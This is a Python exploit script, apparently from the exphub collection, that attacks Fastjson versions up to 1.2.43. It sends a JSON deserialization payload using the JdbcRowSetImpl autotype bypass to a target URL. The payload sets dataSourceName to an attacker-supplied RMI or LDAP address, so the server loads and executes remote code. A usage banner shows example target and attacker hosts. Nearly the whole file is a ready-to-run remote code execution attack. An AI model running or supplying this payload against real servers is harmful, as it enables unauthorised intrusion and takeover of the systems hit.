#!/usr/bin/python3
# -*- coding:utf-8 -*-
# author:zhzyker
# from:https://github.com/zhzyker/exphub

import sys
import requests

if len(sys.argv)!=3:
    print('+------------------------------------------------------------------------------------+')
    print('+ DES: by zhzyker as https://github.com/zhzyker/exphub                               +')
    print('+      RMIServer: rmi://ip:port/exp                                                  +')
    print('+      LDAPServer: ldap://ip:port/exp                                                +')
    print('+------------------------------------------------------------------------------------+')
    print('+ USE: python3 <filename> <target-ip> <RMI/LDAPServer>                               +')
    print('+ EXP: python3 fastjson-1.2.43_rce.py http://1.1.1.1:8080/ ldap://2.2.2.2:88/Object  +')
    print('+ VER: fastjson<=1.2.43                                                              +')
    print('+------------------------------------------------------------------------------------+')
    sys.exit()

url = sys.argv[1]
server = sys.argv[2]

headers = {
    'Host': "127.0.0.1",
    'Content-Type': "application/json",
    'Accept-Encoding': "gzip, deflate",
    'Connection': "close",
    'Accept': "*/*",
    'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
    }
    
payload = """
    {"@type":"[com.sun.rowset.JdbcRowSetImpl"[{,"dataSourceName":"%s", "autoCommit":true}
    """ %server

try:
    r = requests.post(url, payload, headers=headers, timeout=10)
    print ("[+] RMI/LDAP Send Success ")
except:
    print ("[-] RMI/LDAP Send Failed ")

